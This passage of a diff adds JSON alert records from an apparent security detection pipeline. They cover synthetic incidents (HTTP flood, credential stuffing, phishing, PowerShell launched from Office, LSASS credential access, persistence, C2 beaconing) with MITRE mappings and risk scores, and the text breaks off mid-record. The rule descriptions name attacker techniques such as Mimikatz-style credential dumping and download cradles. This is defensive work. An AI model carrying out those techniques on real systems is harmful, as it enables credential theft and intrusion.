+        "message": "GET /?s=39 -> 200"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.199",
+        "threat_type": "Denial of Service",
+        "confidence": "medium",
+        "source": "Anomali",
+        "first_seen": "2026-10-18",
+        "last_seen": "2026-10-25",
+        "tags": "ddos,http-flood",
+        "description": "Source of volumetric HTTP floods against retail portals"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "203.0.113.199"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "web-srv-02"
+      ],
+      "files": []
+    },
+    "summary": "HTTP flood / denial of service: 300 matching event(s) for source.ip=203.0.113.199 between 2026-10-20T14:00:00Z and 2026-10-20T14:04:29Z",
+    "alert_id": "ALT-2026-0001",
+    "risk_score": 85,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 3,
+      "asset": "203.0.113.199",
+      "threat_intel": 6,
+      "volume_corroboration": 6,
+      "confidence_penalty": 0
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-013",
+    "rule_name": "Web credential stuffing",
+    "description": "Forty or more failed authentication responses (401/403) from one IP against the login endpoint within ten minutes.",
+    "type": "threshold",
+    "base_severity": "Medium",
+    "confidence": 0.75,
+    "incident_type": "Brute Force",
+    "playbook": "PB-BRUTE-FORCE",
+    "mitre": [
+      {
+        "id": "T1110.004",
+        "tactic": "Credential Access",
+        "technique": "Brute Force: Credential Stuffing"
+      }
+    ],
+    "entity": {
+      "source.ip": "203.0.113.120"
+    },
+    "group_key": "203.0.113.120",
+    "first_event_ts": "2026-10-20T15:00:00Z",
+    "last_event_ts": "2026-10-20T15:04:33Z",
+    "detected_at": "2026-10-20T15:04:33Z",
+    "event_count": 40,
+    "event_ids": [
+      "EVT-000452",
+      "EVT-000453",
+      "EVT-000454",
+      "EVT-000455",
+      "EVT-000456",
+      "EVT-000457",
+      "EVT-000458",
+      "EVT-000459",
+      "EVT-000460",
+      "EVT-000461",
+      "EVT-000462",
+      "EVT-000463",
+      "EVT-000464",
+      "EVT-000465",
+      "EVT-000466",
+      "EVT-000467",
+      "EVT-000468",
+      "EVT-000469",
+      "EVT-000470",
+      "EVT-000471",
+      "EVT-000472",
+      "EVT-000473",
+      "EVT-000474",
+      "EVT-000475",
+      "EVT-000476",
+      "EVT-000477",
+      "EVT-000480",
+      "EVT-000481",
+      "EVT-000482",
+      "EVT-000483",
+      "EVT-000484",
+      "EVT-000485",
+      "EVT-000486",
+      "EVT-000487",
+      "EVT-000488",
+      "EVT-000489",
+      "EVT-000490",
+      "EVT-000491",
+      "EVT-000492",
+      "EVT-000493"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000452",
+        "ts": "2026-10-20T15:00:00Z",
+        "action": "http_request",
+        "message": "POST /login?user=user0%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000453",
+        "ts": "2026-10-20T15:00:07Z",
+        "action": "http_request",
+        "message": "POST /login?user=user1%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000454",
+        "ts": "2026-10-20T15:00:14Z",
+        "action": "http_request",
+        "message": "POST /login?user=user2%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000455",
+        "ts": "2026-10-20T15:00:21Z",
+        "action": "http_request",
+        "message": "POST /login?user=user3%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000456",
+        "ts": "2026-10-20T15:00:28Z",
+        "action": "http_request",
+        "message": "POST /login?user=user4%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000457",
+        "ts": "2026-10-20T15:00:35Z",
+        "action": "http_request",
+        "message": "POST /login?user=user5%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000458",
+        "ts": "2026-10-20T15:00:42Z",
+        "action": "http_request",
+        "message": "POST /login?user=user6%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000459",
+        "ts": "2026-10-20T15:00:49Z",
+        "action": "http_request",
+        "message": "POST /login?user=user7%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000460",
+        "ts": "2026-10-20T15:00:56Z",
+        "action": "http_request",
+        "message": "POST /login?user=user8%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000461",
+        "ts": "2026-10-20T15:01:03Z",
+        "action": "http_request",
+        "message": "POST /login?user=user9%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000462",
+        "ts": "2026-10-20T15:01:10Z",
+        "action": "http_request",
+        "message": "POST /login?user=user10%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000463",
+        "ts": "2026-10-20T15:01:17Z",
+        "action": "http_request",
+        "message": "POST /login?user=user11%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000464",
+        "ts": "2026-10-20T15:01:24Z",
+        "action": "http_request",
+        "message": "POST /login?user=user12%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000465",
+        "ts": "2026-10-20T15:01:31Z",
+        "action": "http_request",
+        "message": "POST /login?user=user13%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000466",
+        "ts": "2026-10-20T15:01:38Z",
+        "action": "http_request",
+        "message": "POST /login?user=user14%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000467",
+        "ts": "2026-10-20T15:01:45Z",
+        "action": "http_request",
+        "message": "POST /login?user=user15%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000468",
+        "ts": "2026-10-20T15:01:52Z",
+        "action": "http_request",
+        "message": "POST /login?user=user16%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000469",
+        "ts": "2026-10-20T15:01:59Z",
+        "action": "http_request",
+        "message": "POST /login?user=user17%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000470",
+        "ts": "2026-10-20T15:02:06Z",
+        "action": "http_request",
+        "message": "POST /login?user=user18%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000471",
+        "ts": "2026-10-20T15:02:13Z",
+        "action": "http_request",
+        "message": "POST /login?user=user19%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000472",
+        "ts": "2026-10-20T15:02:20Z",
+        "action": "http_request",
+        "message": "POST /login?user=user20%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000473",
+        "ts": "2026-10-20T15:02:27Z",
+        "action": "http_request",
+        "message": "POST /login?user=user21%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000474",
+        "ts": "2026-10-20T15:02:34Z",
+        "action": "http_request",
+        "message": "POST /login?user=user22%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000475",
+        "ts": "2026-10-20T15:02:41Z",
+        "action": "http_request",
+        "message": "POST /login?user=user23%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000476",
+        "ts": "2026-10-20T15:02:48Z",
+        "action": "http_request",
+        "message": "POST /login?user=user24%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000477",
+        "ts": "2026-10-20T15:02:55Z",
+        "action": "http_request",
+        "message": "POST /login?user=user25%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000480",
+        "ts": "2026-10-20T15:03:02Z",
+        "action": "http_request",
+        "message": "POST /login?user=user26%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000481",
+        "ts": "2026-10-20T15:03:09Z",
+        "action": "http_request",
+        "message": "POST /login?user=user27%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000482",
+        "ts": "2026-10-20T15:03:16Z",
+        "action": "http_request",
+        "message": "POST /login?user=user28%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000483",
+        "ts": "2026-10-20T15:03:23Z",
+        "action": "http_request",
+        "message": "POST /login?user=user29%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000484",
+        "ts": "2026-10-20T15:03:30Z",
+        "action": "http_request",
+        "message": "POST /login?user=user30%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000485",
+        "ts": "2026-10-20T15:03:37Z",
+        "action": "http_request",
+        "message": "POST /login?user=user31%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000486",
+        "ts": "2026-10-20T15:03:44Z",
+        "action": "http_request",
+        "message": "POST /login?user=user32%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000487",
+        "ts": "2026-10-20T15:03:51Z",
+        "action": "http_request",
+        "message": "POST /login?user=user33%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000488",
+        "ts": "2026-10-20T15:03:58Z",
+        "action": "http_request",
+        "message": "POST /login?user=user34%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000489",
+        "ts": "2026-10-20T15:04:05Z",
+        "action": "http_request",
+        "message": "POST /login?user=user35%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000490",
+        "ts": "2026-10-20T15:04:12Z",
+        "action": "http_request",
+        "message": "POST /login?user=user36%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000491",
+        "ts": "2026-10-20T15:04:19Z",
+        "action": "http_request",
+        "message": "POST /login?user=user37%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000492",
+        "ts": "2026-10-20T15:04:26Z",
+        "action": "http_request",
+        "message": "POST /login?user=user38%40corp.local -> 401"
+      },
+      {
+        "event_id": "EVT-000493",
+        "ts": "2026-10-20T15:04:33Z",
+        "action": "http_request",
+        "message": "POST /login?user=user39%40corp.local -> 401"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "203.0.113.120"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "web-srv-02"
+      ],
+      "files": []
+    },
+    "summary": "Web credential stuffing: 40 matching event(s) for source.ip=203.0.113.120 between 2026-10-20T15:00:00Z and 2026-10-20T15:04:33Z",
+    "alert_id": "ALT-2026-0002",
+    "risk_score": 52,
+    "severity": "Medium",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 3,
+      "asset": "203.0.113.120",
+      "threat_intel": 0,
+      "volume_corroboration": 4,
+      "confidence_penalty": 0
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-020",
+    "rule_name": "Phishing email from known malicious domain",
+    "description": "Inbound email originating from an IOC-listed domain or carrying an IOC-listed attachment hash.",
+    "type": "match",
+    "base_severity": "High",
+    "confidence": 0.9,
+    "incident_type": "Phishing",
+    "playbook": "PB-PHISHING",
+    "mitre": [
+      {
+        "id": "T1566.001",
+        "tactic": "Initial Access",
+        "technique": "Phishing: Spearphishing Attachment"
+      }
+    ],
+    "entity": {
+      "email.recipient": "j.patel@corp.local"
+    },
+    "group_key": "j.patel@corp.local",
+    "first_event_ts": "2026-10-23T09:12:00Z",
+    "last_event_ts": "2026-10-23T09:12:00Z",
+    "detected_at": "2026-10-23T09:12:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000818"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000818",
+        "ts": "2026-10-23T09:12:00Z",
+        "action": "email_delivered",
+        "message": "mail Invoice_Oct2026.zip - payment overdue from billing@secure-auth-portal.com verdict=delivered"
+      }
+    ],
+    "intel": [
+      {
+        "type": "domain",
+        "value": "secure-auth-portal.com",
+        "threat_type": "Phishing",
+        "confidence": "high",
+        "source": "PhishTank",
+        "first_seen": "2026-10-15",
+        "last_seen": "2026-10-26",
+        "tags": "phishing,credential-harvesting",
+        "description": "Credential harvesting page impersonating the corporate SSO portal"
+      },
+      {
+        "type": "sha256",
+        "value": "4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f90112233445566778899aabbccddeeff00",
+        "threat_type": "Malware",
+        "confidence": "high",
+        "source": "ThreatConnect",
+        "first_seen": "2026-10-16",
+        "last_seen": "2026-10-26",
+        "tags": "loader,powershell",
+        "description": "Signed-loLBin PowerShell loader used for initial execution"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "203.0.113.45"
+      ],
+      "destination_ips": [],
+      "domains": [
+        "secure-auth-portal.com"
+      ],
+      "users": [],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Phishing email from known malicious domain: 1 matching event(s) for email.recipient=j.patel@corp.local between 2026-10-23T09:12:00Z and 2026-10-23T09:12:00Z",
+    "alert_id": "ALT-2026-0013",
+    "risk_score": 92,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-021",
+    "rule_name": "Office application spawns PowerShell",
+    "description": "A Microsoft Office process creates a PowerShell child process, the classic macro-based execution chain.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.9,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1204.002",
+        "tactic": "Execution",
+        "technique": "User Execution: Malicious File"
+      },
+      {
+        "id": "T1059.001",
+        "tactic": "Execution",
+        "technique": "Command and Scripting Interpreter: PowerShell"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local"
+    },
+    "group_key": "ws-fin-14.corp.local",
+    "first_event_ts": "2026-10-23T09:34:00Z",
+    "last_event_ts": "2026-10-23T09:34:00Z",
+    "detected_at": "2026-10-23T09:34:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000825"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000825",
+        "ts": "2026-10-23T09:34:00Z",
+        "action": "process_created",
+        "message": "process created powershell.exe"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Office application spawns PowerShell: 1 matching event(s) for host.name=ws-fin-14.corp.local between 2026-10-23T09:34:00Z and 2026-10-23T09:34:00Z",
+    "alert_id": "ALT-2026-0014",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-022",
+    "rule_name": "Encoded PowerShell command",
+    "description": "PowerShell executed with an encoded, hidden or download cradle argument set.",
+    "type": "match",
+    "base_severity": "High",
+    "confidence": 0.85,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1059.001",
+        "tactic": "Execution",
+        "technique": "Command and Scripting Interpreter: PowerShell"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local"
+    },
+    "group_key": "ws-fin-14.corp.local",
+    "first_event_ts": "2026-10-23T09:34:00Z",
+    "last_event_ts": "2026-10-23T09:34:00Z",
+    "detected_at": "2026-10-23T09:34:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000825"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000825",
+        "ts": "2026-10-23T09:34:00Z",
+        "action": "process_created",
+        "message": "process created powershell.exe"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Encoded PowerShell command: 1 matching event(s) for host.name=ws-fin-14.corp.local between 2026-10-23T09:34:00Z and 2026-10-23T09:34:00Z",
+    "alert_id": "ALT-2026-0015",
+    "risk_score": 80,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-023",
+    "rule_name": "LSASS credential access",
+    "description": "A process requests access to the LSASS process memory, consistent with credential dumping tooling such as Mimikatz.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.9,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1003.001",
+        "tactic": "Credential Access",
+        "technique": "OS Credential Dumping: LSASS Memory"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local"
+    },
+    "group_key": "ws-fin-14.corp.local",
+    "first_event_ts": "2026-10-23T10:30:00Z",
+    "last_event_ts": "2026-10-23T10:30:00Z",
+    "detected_at": "2026-10-23T10:30:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000887"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000887",
+        "ts": "2026-10-23T10:30:00Z",
+        "action": "process_access",
+        "message": "process access to lsass.exe"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "LSASS credential access: 1 matching event(s) for host.name=ws-fin-14.corp.local between 2026-10-23T10:30:00Z and 2026-10-23T10:30:00Z",
+    "alert_id": "ALT-2026-0021",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-024",
+    "rule_name": "Scheduled task persistence",
+    "description": "Creation of a scheduled task through schtasks.exe or the Task Scheduler service.",
+    "type": "match",
+    "base_severity": "High",
+    "confidence": 0.8,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1053.005",
+        "tactic": "Persistence",
+        "technique": "Scheduled Task/Job: Scheduled Task"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local"
+    },
+    "group_key": "ws-fin-14.corp.local",
+    "first_event_ts": "2026-10-23T09:40:00Z",
+    "last_event_ts": "2026-10-23T09:40:00Z",
+    "detected_at": "2026-10-23T09:40:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000831"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000831",
+        "ts": "2026-10-23T09:40:00Z",
+        "action": "process_created",
+        "message": "process created schtasks.exe"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Scheduled task persistence: 1 matching event(s) for host.name=ws-fin-14.corp.local between 2026-10-23T09:40:00Z and 2026-10-23T09:40:00Z",
+    "alert_id": "ALT-2026-0019",
+    "risk_score": 80,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-025",
+    "rule_name": "Registry run key autorun",
+    "description": "Persistence written to a Run or RunOnce registry key.",
+    "type": "match",
+    "base_severity": "Medium",
+    "confidence": 0.75,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1547.001",
+        "tactic": "Persistence",
+        "technique": "Boot or Logon Autostart Execution: Registry Run Keys"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local"
+    },
+    "group_key": "ws-fin-14.corp.local",
+    "first_event_ts": "2026-10-23T09:38:00Z",
+    "last_event_ts": "2026-10-23T09:38:00Z",
+    "detected_at": "2026-10-23T09:38:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000830"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000830",
+        "ts": "2026-10-23T09:38:00Z",
+        "action": "registry_value_set",
+        "message": "sysmon event 13"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Registry run key autorun: 1 matching event(s) for host.name=ws-fin-14.corp.local between 2026-10-23T09:38:00Z and 2026-10-23T09:38:00Z",
+    "alert_id": "ALT-2026-0018",
+    "risk_score": 55,
+    "severity": "Medium",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-026",
+    "rule_name": "Communication with known malicious infrastructure",
+    "description": "Network or DNS telemetry contacts an IP or domain listed in the threat-intelligence feed as command and control or malware distribution.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.9,
+    "incident_type": "Malware",
+    "playbook": "PB-C2",
+    "mitre": [
+      {
+        "id": "T1071.001",
+        "tactic": "Command and Control",
+        "technique": "Application Layer Protocol: Web Protocols"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local"
+    },
+    "group_key": "ws-fin-14.corp.local",
+    "first_event_ts": "2026-10-23T09:35:00Z",
+    "last_event_ts": "2026-10-23T11:25:00Z",
+    "detected_at": "2026-10-23T11:25:00Z",
+    "event_count": 65,
+    "event_ids": [
+      "EVT-000826",
+      "EVT-000832",
+      "EVT-000833",
+      "EVT-000834",
+      "EVT-000835",
+      "EVT-000836",
+      "EVT-000837",
+      "EVT-000838",
+      "EVT-000839",
+      "EVT-000840",
+      "EVT-000841",
+      "EVT-000842",
+      "EVT-000843",
+      "EVT-000844",
+      "EVT-000845",
+      "EVT-000846",
+      "EVT-000847",
+      "EVT-000848",
+      "EVT-000849",
+      "EVT-000850",
+      "EVT-000851",
+      "EVT-000852",
+      "EVT-000853",
+      "EVT-000854",
+      "EVT-000855",
+      "EVT-000856",
+      "EVT-000857",
+      "EVT-000858",
+      "EVT-000859",
+      "EVT-000860",
+      "EVT-000861",
+      "EVT-000862",
+      "EVT-000863",
+      "EVT-000864",
+      "EVT-000865",
+      "EVT-000866",
+      "EVT-000867",
+      "EVT-000868",
+      "EVT-000869",
+      "EVT-000870",
+      "EVT-000871",
+      "EVT-000872",
+      "EVT-000873",
+      "EVT-000874",
+      "EVT-000875",
+      "EVT-000876",
+      "EVT-000877",
+      "EVT-000878",
+      "EVT-000879",
+      "EVT-000880"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000826",
+        "ts": "2026-10-23T09:35:00Z",
+        "action": "dns_query",
+        "message": "dns query cdn-update-sync.com"
+      },
+      {
+        "event_id": "EVT-000832",
+        "ts": "2026-10-23T09:44:00Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000833",
+        "ts": "2026-10-23T09:44:09Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000834",
+        "ts": "2026-10-23T09:44:18Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000835",
+        "ts": "2026-10-23T09:44:27Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000836",
+        "ts": "2026-10-23T09:44:36Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000837",
+        "ts": "2026-10-23T09:44:45Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000838",
+        "ts": "2026-10-23T09:44:54Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000839",
+        "ts": "2026-10-23T09:45:03Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000840",
+        "ts": "2026-10-23T09:45:12Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000841",
+        "ts": "2026-10-23T09:45:21Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000842",
+        "ts": "2026-10-23T09:45:30Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000843",
+        "ts": "2026-10-23T09:45:39Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000844",
+        "ts": "2026-10-23T09:45:48Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000845",
+        "ts": "2026-10-23T09:45:57Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000846",
+        "ts": "2026-10-23T09:46:06Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000847",
+        "ts": "2026-10-23T09:46:15Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000848",
+        "ts": "2026-10-23T09:46:24Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000849",
+        "ts": "2026-10-23T09:46:33Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000850",
+        "ts": "2026-10-23T09:46:42Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000851",
+        "ts": "2026-10-23T09:46:51Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000852",
+        "ts": "2026-10-23T09:47:00Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000853",
+        "ts": "2026-10-23T09:47:09Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000854",
+        "ts": "2026-10-23T09:47:18Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000855",
+        "ts": "2026-10-23T09:47:27Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000856",
+        "ts": "2026-10-23T09:47:36Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000857",
+        "ts": "2026-10-23T09:47:45Z",
